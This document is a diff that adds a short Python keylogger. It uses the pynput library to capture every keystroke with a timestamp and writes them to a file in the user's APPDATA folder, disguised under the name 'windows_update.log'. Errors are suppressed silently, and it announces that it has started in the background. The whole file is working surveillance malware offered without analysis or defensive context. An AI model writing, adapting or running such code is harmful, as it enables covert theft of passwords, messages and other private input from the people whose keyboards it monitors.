@@ -1,0 +1,23 @@
+### python 
+import pynput.keyboard as kb
+import datetime
+import os
+import threading
+
+log_file = os.path.join(os.getenv('APPDATA'), 'windows_update.log')
+
+def on_press(key):
+    try:
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(log_file, "a", encoding="utf-8") as f:
+            if hasattr(key, 'char') and key.char is not None:
+                f.write(f"{timestamp} - {key.char}\n")
+            else:
+                special = str(key).replace("Key.", "").upper()
+                f.write(f"{timestamp} - [{special}]\n")
+    except:
+        pass
+
+print("[+] Keylogger started in background...")
+with kb.Listener(on_press=on_press) as listener:
+    listener.join()
